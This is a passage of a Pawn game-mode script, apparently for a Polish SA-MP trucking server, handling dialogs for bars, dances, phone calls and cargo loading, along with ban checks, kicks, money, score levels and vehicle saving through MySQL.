					strcat(komendy, "{FFFFFF}/zaladuj - ladujesz towar\n{FFFFFF}/rozladuj - rozladowywujesz ladunek z naczepy\n{FFFFFF}/dokumenty - pokazujesz czy towar jest lg czy nlg\n{FFFFFF}/me - piszesz do graczy w odleglosci 40 m\n{FFFFFF}/menu - Telefon, opcje pojazdu itp\n/report [id] [tresc] - skladasz report na gracza\n/admins - lista adminow online\n/flip - przewracasz pojazd na 4 kola");
					ShowPlayerDialog(playerid, Komendy, DIALOG_STYLE_MSGBOX, "Podstawowe Komendy Gracza", komendy, "<< Cofnij", "Wyjdz");
				}
			}
		}
		if(dialogid == BAR)
		{
			if(response == 1)
			{
				if(listitem == 0)
				{

					GivePlayerMoney(playerid, -10);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
					SendClientMessage(playerid, Niebieski, "Kupiles: {A0A0A0}Cygaro");

				}
				if(listitem == 1)
				{

					GivePlayerMoney(playerid, -15);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
					SendClientMessage(playerid, Niebieski, "Kupiles: {A0A0A0}Piwo");
				}
				if(listitem == 2)
				{
					GivePlayerMoney(playerid, -25);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
					SendClientMessage(playerid, Niebieski, "Kupiles: {A0A0A0}Wino");

				}
				if(listitem == 3)
				{
					GivePlayerMoney(playerid, -5);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_SPRUNK);
					SendClientMessage(playerid, Niebieski, "Kupiles: {A0A0A0}Sprunk");
				}
			}
		}

		if(dialogid == DANCE)
		{
			if(response == 1)
			{
				if(listitem == 0)
				{

					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE1);
					SendClientMessage(playerid, Niebieski, "Styl 1: Dance, Dance, Dance!");
				}
				if(listitem == 1)
				{

					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE2);
					SendClientMessage(playerid, Czerwony, "Styl 2: Dance, Dance, Dance!");
				}
				if(listitem == 2)
				{
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE3);
					SendClientMessage(playerid, Zolty, "Styl 3: Dance, Dance, Dance!");

				}
				if(listitem == 3)
				{
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE4);
					SendClientMessage(playerid, Pomaranczowy, "Styl 4: Dance, Dance, Dance!");
				}
			}
		}
		if(dialogid == Telefon)
		{
			if(response == 0)
			{
				SendClientMessage(playerid,Zielony,"# Anulowales telefon!");
			}
			if(response == 1)
			{

				if(listitem == 0)
				{
					new string[150];
					format(string,sizeof string,"%s: %d - Potrzebuje Policji",PlayerName(playerid),playerid);
					SendClientMessageToAll(Zolty,string);
				}
				if(listitem == 1)
				{
					new string[150];
					format(string,sizeof string,"%s: %d - Potrzebuje Pomocy Drogowej",PlayerName(playerid),playerid);
					SendClientMessageToAll(Zolty,string);
				}
				if(listitem == 2)
				{
					new string[150];
					format(string,sizeof string,"%s: %d - Potrzebuje Pogotowia",PlayerName(playerid),playerid);
					SendClientMessageToAll(Zolty,string);
				}
				if(listitem == 3)
				{
					new string[150];
					format(string,sizeof string,"%s: %d - Potrzebuje Taxi!",PlayerName(playerid),playerid);
					SendClientMessageToAll(Zolty,string);
				}
			}
		}




		if(dialogid == 690) // Towar legalny czy nielegalny
		{
			if(response == 1)
			{
				if(listitem == 0) // Legalne
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `Legal` = '1' AND `vip` = '0' AND `special` = '0' AND `gabaryt` = '0' AND `adr` = '0' AND `wio` = '0' AND `zwierzeta` = '0' AND `inne` = '0'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 691, DIALOG_STYLE_LIST, "Wybierz Towar - Legalne", globalstring, "Zaladuj","Anuluj");
				}


				if(listitem == 1) // Nie legalne
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `NoLegal` = '1' AND `vip` = '0' AND `special` = '0' AND `gabaryt` = '0' AND `adr` = '0' AND `wio` = '0' AND `zwierzeta` = '0' AND `inne` = '0'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 692, DIALOG_STYLE_LIST, "Wybierz Towar - Nielegalne", globalstring, "Zaladuj","Anuluj");
				}

				if(listitem == 2) // PREMIUM
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `vip` = '1' AND `special` = '0' AND `gabaryt` = '0' AND `adr` = '0' AND `wio` = '0' AND `zwierzeta` = '0' AND `inne` = '0'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 693, DIALOG_STYLE_LIST, "Wybierz Towar - PREMIUM", globalstring, "Zaladuj","Anuluj");
				}
				if(listitem == 3) // gabaryty
				{
					//printf("test");
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `gabaryt` = '1' AND `adr` = '0' AND `wio` = '0' AND `zwierzeta` = '0' AND `inne` = '0'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 694, DIALOG_STYLE_LIST, "Wybierz Towar - PonadGabarytowe", globalstring, "Zaladuj","Anuluj");
				}
				if(listitem == 4) // adr
				{
					if(PlayerInfo[playerid][ADR] == true)
					{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `adr` = '1' AND `wio` = '0' AND `zwierzeta` = '0' AND `inne` = '0'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 695, DIALOG_STYLE_LIST, "Wybierz Towar - ADR", globalstring, "Zaladuj","Anuluj");
					}
					else
					{
						SendClientMessage(playerid,Szary,"# Nie posiadasz licencji ADR! Mozesz ja kupic na panelu pwtruck.pl");
					}

				}
				if(listitem == 5 && BonusCargo == true) // SPECJALNE
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `special` = '1'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 700, DIALOG_STYLE_LIST, "Wybierz Towar - Specjalne", globalstring, "Zaladuj","Anuluj");
				}
			}

			if(dialogid == 701) // Towar dostawczak
			{
				if(listitem == 0) // zboza
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `adr` = '1'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 702, DIALOG_STYLE_LIST, "Wybierz Towar - Zboza", globalstring, "Zaladuj","Anuluj");
				}

				if(listitem == 1) // warzywa i owoce
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `wio` = '1'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 703, DIALOG_STYLE_LIST, "Wybierz Towar - Warzywa i owoce", globalstring, "Zaladuj","Anuluj");
				}
				if(listitem == 2) // zwierzeta hodowlane
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `zwierzeta` = '1'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 704, DIALOG_STYLE_LIST, "Wybierz Towar - Zwierzeta hodowlane", globalstring, "Zaladuj","Anuluj");
				}
				if(listitem == 3) // inne
				{
					new Query[400], i=0;
					format(Query, sizeof(Query), "SELECT `id`,`name`,`minlegal`,`minnielegal` FROM `cargos` WHERE `inne` = '1'");
					mysql_query(Query);
					mysql_store_result();
					new guiCargoID,guiCargoName[60],guiCargoLG,guiCargoNLG;
					new globalstring[450];
					new stringadd[80];
					while(mysql_fetch_row(Query,"|"))
					{
						if(mysql_num_rows() != 0)
						{

							sscanf(Query, "p<|>ds[60]dd",guiCargoID,guiCargoName,guiCargoLG,guiCargoNLG);
							format(stringadd,sizeof stringadd,"{FFFFFF}%s "CZERWONYHEX"Wymaga LG: %d NLG: %d\n",guiCargoName,guiCargoLG,guiCargoNLG);
							strcat(globalstring, stringadd);
							InputCargo[playerid][i] = guiCargoID;

							i++;
						}
					}
					mysql_free_result();

					InputCargosNum[playerid] = i;
					ShowPlayerDialog(playerid, 705, DIALOG_STYLE_LIST, "Wybierz Towar - Inne", globalstring, "Zaladuj","Anuluj");
				}
			}
		}
		if(dialogid == 691) // Towary Legalne >> Nie dotykac!
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}


		if(dialogid == 692) // Towary NIELegalne >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}

		if(dialogid == 693) // Towary PREMIUM >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}
		if(dialogid == 694) // Towary ponadgabarytowe >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}
		if(dialogid == 695) // Towary adr >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}
		if(dialogid == 700) // Towary SPECJALNE! >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				if(BonusCargo == true)
				{
					new i = 0;
					while(i < InputCargosNum[playerid])
					{
						if(listitem == i)
						{
							LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
							//BonusCargo = false;
						}
						i++;
					}
				}
				else
				{
					return SendClientMessage(playerid,Zielony,"# Bonus specjalny jest juz nieaktywny!");
				}
			}
		}
		if(dialogid == 702) // Towary zboza >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}
		if(dialogid == 703) // Towary wio >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}
		if(dialogid == 704) // Towary zwierzeta >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}
		if(dialogid == 705) // Towary inne >> Nie dotykac! !!!!! ---
		{
			if(response == 1)
			{
				new i = 0;
				while(i < InputCargosNum[playerid])
				{
					if(listitem == i)
					{
						LoadCargoToTrailer(playerid,InputCargo[playerid][i]);
					}
					i++;
				}
			}
		}

		return 1;
	}

	forward OnHostResponse(iIndex, response_code, Data[]);
	public OnHostResponse(iIndex, response_code, Data[])
	{
		new szBuffer[128];
		LoopBack:
		if(response_code == 200)
		{
			new datas[150];
			format(datas,sizeof datas,"%s",Data);
			PlayerHost[iIndex] = datas;
			printf("[LOGS] Host %s : %s",PlayerName(iIndex),Data);
		}
		else
		{
			format(szBuffer, sizeof(szBuffer), "Can't send your request. {C21F1F}Response_Code: %i", response_code);
			SendClientMessage(iIndex, -1, szBuffer);
			goto LoopBack;
		}
	}

	forward napisalminuscmd(playerid);
	public napisalminuscmd(playerid)
	{
		SetPVarInt(playerid,"napisalcmd",GetPVarInt(playerid,"napisal")-1);
		return 1;
	}


	public OnPlayerCommandPerformed(playerid, cmdtext[], success)
	{
		if(success != 1)
		{
			return SendClientMessage(playerid,Szary,"# Ta komenda nie istnieje!");
		}

		new string[150];
		format(string,sizeof string,"# EYE CMD: "BIALYHEX"%s[%d] "CZERWONYHEX"- "BIALYHEX"%s",PlayerName(playerid),playerid,cmdtext);
		for(new i = 0; i < GetMaxPlayers(); i++)
		{
			if(IsPlayerConnected(i) && PlayerInfo[i][LevelAdmin] >= 5 && GetPVarInt(i,"eyecmd") == 1)
			{
				SendClientMessage(i,Czerwony,string);
			}
		}

		SetPVarInt(playerid,"napisalcmd",GetPVarInt(playerid,"napisalcmd")+1);

		timernapisalcmd[playerid] = SetTimerEx("napisalminuscmd",1200,false,"i",playerid);

		if(GetPVarInt(playerid,"napisalcmd") == 3)
		{
			return KickExServer(playerid,"Spam/Flood");
		}

		return 1;

	}


	/*
	#define GiveMoneyEx(%0,%1) SetPVarInt(%0,"money",GetMoneyEx(%0) + %1); GivePlayerMoney(%0,%1)
	#define GetMoneyEx(%0) GetPVarInt(%0,"money")
	#define SetMoneyEx(%0,%1) SetPVarInt(%0,"money",GetMoneyEx(%0) - %1); GivePlayerMoney(%0,-%1)
	#define GiveScoreEx(%0,%1) SetPVarInt(%0,"score",%1); SetPlayerScore(%0,%1)
	#define GetScoreEx(%0) GetPVarInt(%0,"score")
	*/
	stock PlayerToPoint(Float:radi, playerid, Float:x9, Float:y9, Float:z9)
	{
		new Float:oldposx9, Float:oldposy9, Float:oldposz9;
		new Float:tempposx9, Float:tempposy9, Float:tempposz9;
		GetPlayerPos(playerid, oldposx9, oldposy9, oldposz9);
		tempposx9 = (oldposx9 -x9);
		tempposy9 = (oldposy9 -y9);
		tempposz9 = (oldposz9 -z9);
		if (((tempposx9 < radi) && (tempposx9 > -radi)) && ((tempposy9 < radi) && (tempposy9 > -radi)) && ((tempposz9 < radi) && (tempposz9 > -radi)))
		{
			return 1;
		}
		return 0;
	}
	/*stock IsPlayerInArea(playerid, Float:max_x, Float:min_x, Float:max_y, Float:min_y)
	{
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		if(X <= max_x && X >= min_x && Y <= max_y && Y >= min_y) return 1;
		return 0;
	}*/
	/*stock GetVehicleSpeed(vehicleid)
	{
		new Float:xPos[3];
		GetVehicleVelocity(vehicleid, xPos[0], xPos[1], xPos[2]);
		return floatround(floatsqroot(xPos[0] * xPos[0] + xPos[1] * xPos[1] + xPos[2] * xPos[2]) * 170.00);
	}*/
	stock CheckBan(playerid)
	{
		new playerip[16],playerserial[128],banlast,banid;
		gpci(playerid,playerserial,sizeof(playerserial));
		GetPlayerIp(playerid, playerip, sizeof(playerip));
		new buffer[400];
		format(buffer,sizeof buffer,"SELECT `id`,`banto` FROM `bans` WHERE `ip` = '%s'",playerip);
		mysql_query(buffer);
		mysql_store_result();
		mysql_fetch_row(buffer,"|");
		new num = mysql_num_rows();
		if(num >= 1)
		{
			sscanf(buffer,"p<|>dd",banid,banlast);
			new stringvip[200]; // to ban oczywiscie
			format(stringvip,sizeof stringvip,"SELECT IFNULL(DATEDIFF(`banto`,NOW()),'-5') FROM `bans` WHERE `id` = '%d'",banid);
			mysql_query(stringvip);
			new banday;
			
		       
			mysql_store_result();
		    mysql_fetch_row(stringvip);
		       
		    if(mysql_num_rows()) 
			{
		    sscanf(stringvip, "p<|>d", banday);
		    printf("[ban system] %s - pozostalo %d dni bana!",PlayerName(playerid),banday);
			
		    }
		       
			
			
			if(banday <= 0)
			{
			format(stringvip,sizeof stringvip,"DELETE FROM `bans` WHERE `id` = '%d'",banid);
			mysql_query(stringvip);
			format(stringvip,sizeof stringvip,"# Zostales Automatycznie Odbanowany");
			SendClientMessage(playerid,JasnyNiebieski,stringvip);
			}
			else if(banday >= 1)
			{
			SetPVarInt(playerid,"banned",1);
			format(stringvip,sizeof stringvip,"# Konto Zbanowane! Zostaniesz odbanowany za %d dni!",banday);
			SendClientMessage(playerid,JasnyNiebieski,stringvip);
			KickExServer(playerid,"Aktywny Ban");
			SetPlayerVirtualWorld(playerid, 69);
			
			}
		}
		mysql_free_result();




		return 1;
	}


	stock BanAdd(playerid,reason[],admin,days)
	{
		new playerip[16],playerserial[128];
		gpci(playerid,playerserial,sizeof(playerserial));
		GetPlayerIp(playerid, playerip, sizeof(playerip));
		new buffer[400];
		format(buffer,sizeof buffer,"INSERT INTO `bans`(`nick`, `gcpi`, `ip`, `reason`, `admin`,`banto`) VALUES ('%s','%s','%s','%s','%s','0000-00-00 00:00:00')",PlayerName(playerid),playerserial,playerip,reason,PlayerName(admin));
		mysql_query(buffer);

		new Year, Month, Day;
		getdate(Year, Month, Day);
		new query[400];
		format(query,sizeof query,"SELECT `id` FROM `bans` WHERE `gcpi` = '%s' AND `ip` = '%s'",playerserial,playerip);
		mysql_query(query);
		mysql_store_result();
		new idban;
		mysql_fetch_row(query,"|");
		sscanf(query,"p<|>d",idban);
		mysql_free_result();
		if(days >= 1)
		{
		format(query,sizeof query,"UPDATE `bans` SET `banto` = DATE_ADD(NOW() , INTERVAL %d DAY) WHERE `reason` = '%s' AND `id` = '%d'",days,reason,idban);
		}
		else
		{
		format(query,sizeof query,"UPDATE `bans` SET `banto` = DATE_ADD(NOW() , INTERVAL 999 DAY) WHERE `reason` = '%s' AND `id` = '%d'",reason,idban);
		}
		mysql_query(query);





		
		return printf("[BAN LOG] Ban %s zostal dodany!",PlayerName(playerid));

		
	}



	stock GiveMoneyEx(playerid,moneys)
	{
		GivePlayerMoney(playerid,moneys);
		return SetPVarInt(playerid,"money",GetPVarInt(playerid,"money")+moneys);
	}
	stock GetMoneyEx(playerid)
	{
		return GetPVarInt(playerid,"money");
	}

	stock GiveScoreEx(playerid,scores)
	{
		SetPlayerScore(playerid,scores);
		return SetPVarInt(playerid,"score",scores);
	}
	stock PoziomGracza(playerid)
	{
		if(PlayerInfo[playerid][Score] >= 0 && PlayerInfo[playerid][Score] <= 50){PlayerInfo[playerid][Poziom] = 1;} //Level 1
		if(PlayerInfo[playerid][Score] >= 51 && PlayerInfo[playerid][Score] <= 150){PlayerInfo[playerid][Poziom] = 2;} //Level 2
		if(PlayerInfo[playerid][Score] >= 151 && PlayerInfo[playerid][Score] <= 300){PlayerInfo[playerid][Poziom] = 3;} //Level 3
		if(PlayerInfo[playerid][Score] >= 301 && PlayerInfo[playerid][Score] <= 500){PlayerInfo[playerid][Poziom] = 4;} //level 4
		if(PlayerInfo[playerid][Score] >= 501 && PlayerInfo[playerid][Score] <= 750){PlayerInfo[playerid][Poziom] = 5;} //Level 5
		if(PlayerInfo[playerid][Score] >= 751 && PlayerInfo[playerid][Score] <= 1050){PlayerInfo[playerid][Poziom] = 6;} //Level 6
		if(PlayerInfo[playerid][Score] >= 1051 && PlayerInfo[playerid][Score] <= 1400){PlayerInfo[playerid][Poziom] = 7;} //Level 7
		if(PlayerInfo[playerid][Score] >= 1401 && PlayerInfo[playerid][Score] <= 1800){PlayerInfo[playerid][Poziom] = 8;}  //Level 8
		if(PlayerInfo[playerid][Score] >= 1801 && PlayerInfo[playerid][Score] <= 2250){PlayerInfo[playerid][Poziom] = 9;} //Level 9
		if(PlayerInfo[playerid][Score] >= 2251 && PlayerInfo[playerid][Score] <= 2750){PlayerInfo[playerid][Poziom] = 10;} //Level 10
		if(PlayerInfo[playerid][Score] >= 2751 && PlayerInfo[playerid][Score] <= 3300){PlayerInfo[playerid][Poziom] = 11;} //Level 11
		if(PlayerInfo[playerid][Score] >= 3301 && PlayerInfo[playerid][Score] <= 3900){PlayerInfo[playerid][Poziom] = 12;} //Level 12
		if(PlayerInfo[playerid][Score] >= 3901 && PlayerInfo[playerid][Score] <= 4550){PlayerInfo[playerid][Poziom] = 13;} //Level 13
		if(PlayerInfo[playerid][Score] >= 4551 && PlayerInfo[playerid][Score] <= 5250){PlayerInfo[playerid][Poziom] = 14;} //Level 14
		if(PlayerInfo[playerid][Score] >= 5251 && PlayerInfo[playerid][Score] <= 6000){PlayerInfo[playerid][Poziom] = 15;} //Level 15
		if(PlayerInfo[playerid][Score] >= 6001 && PlayerInfo[playerid][Score] <= 6800){PlayerInfo[playerid][Poziom] = 16;} //Level 16
		if(PlayerInfo[playerid][Score] >= 6801 && PlayerInfo[playerid][Score] <= 7650){PlayerInfo[playerid][Poziom] = 17;} //Level 17
		if(PlayerInfo[playerid][Score] >= 7651 && PlayerInfo[playerid][Score] <= 8550){PlayerInfo[playerid][Poziom] = 18;} //Level 18
		if(PlayerInfo[playerid][Score] >= 8551 && PlayerInfo[playerid][Score] <= 9500){PlayerInfo[playerid][Poziom] = 19;} //Level 19
		if(PlayerInfo[playerid][Score] >= 9501 && PlayerInfo[playerid][Score] <= 10500){PlayerInfo[playerid][Poziom] = 20;} //Level 20
		if(PlayerInfo[playerid][Score] >= 10501 && PlayerInfo[playerid][Score] <= 11550){PlayerInfo[playerid][Poziom] = 21;} //Level 21
		if(PlayerInfo[playerid][Score] >= 11551 && PlayerInfo[playerid][Score] <= 12650){PlayerInfo[playerid][Poziom] = 22;} //Level 22
		if(PlayerInfo[playerid][Score] >= 12651 && PlayerInfo[playerid][Score] <= 13800){PlayerInfo[playerid][Poziom] = 23;} //Level 23
		if(PlayerInfo[playerid][Score] >= 13801 && PlayerInfo[playerid][Score] <= 15000){PlayerInfo[playerid][Poziom] = 24;} //Level 24
		if(PlayerInfo[playerid][Score] >= 15001 && PlayerInfo[playerid][Score] <= 16250){PlayerInfo[playerid][Poziom] = 25;} //Level 25
		if(PlayerInfo[playerid][Score] >= 16251 && PlayerInfo[playerid][Score] <= 17550){PlayerInfo[playerid][Poziom] = 26;} //Level 26
		if(PlayerInfo[playerid][Score] >= 17551 && PlayerInfo[playerid][Score] <= 18900){PlayerInfo[playerid][Poziom] = 27;} //Level 27
		if(PlayerInfo[playerid][Score] >= 18901 && PlayerInfo[playerid][Score] <= 20300){PlayerInfo[playerid][Poziom] = 28;} //Level 28
		return 1;
	}

	stock GetScoreEx(playerid)
	{
		return GetPVarInt(playerid,"score");
	}


	stock SaveVehicles()
	{
		for(new i=0; i <= LoadedInfo[Vehicles]; i++)
		{
			if(IsVehicleOccupied(i))
			{
				new query[200];
				new uid = VehicleInfo[i][UID];
				format(query,sizeof query,"UPDATE `vehicles` SET `Paliwo` = '%d', `Przebieg` = '%0.2f', `Olej` = '%d' WHERE `id` = '%d'",VehicleInfo[i][Paliwo],VehicleInfo[i][Przebieg],VehicleInfo[i][Olej],uid);
				mysql_query(query);
			}
		}

		return 1;
	}


	stock ZacznijLowic(playerid, Float:obrot)
	{
		PlayerInfo[playerid][Lowi] = true;
		SetPlayerFacingAngle(playerid, obrot);
		TogglePlayerControllable(playerid, false);
		SetPlayerAttachedObject(playerid, 1, 18632, 6,0.050999, 0.017000, 0.067999, 0.000000, 162.699966, -171.100036);
		ApplyAnimation(playerid, "SWORD", "sword_block", 50.0, 0,1,0,1,1);
		SetTimerEx("WyciagnijRybe", 5000, false, "i", playerid);
		SendClientMessage(playerid, Zielony, "Zaczynasz lowic...");
		return 1;
	}

	stock ClearAnimationsEx(playerid)
	{
		ClearAnimations(playerid, 1);
		new sid = GetPlayerSkin(playerid);
		SetPlayerSkin(playerid, sid);

		return 1;
	}

	stock KickExServer(playerid, reason[])
	{
		new string[200];
		format(string,sizeof string,"# Gracz "BIALYHEX"%s"CZERWONYHEX" zostal wyrzucony z servera! || Powod: "BIALYHEX"%s",PlayerName(playerid),reason);
		SendClientMessageToAll(Czerwony,string);
		SaveUser(playerid);
		SetTimerEx("kicktimer",200,false,"i",playerid);

		return 1;
	}



	forward kicktimer(playerid);
	public kicktimer(playerid)
	{
		return Kick(playerid);
	}

	stock BanExServer(playerid, reason[], dni)
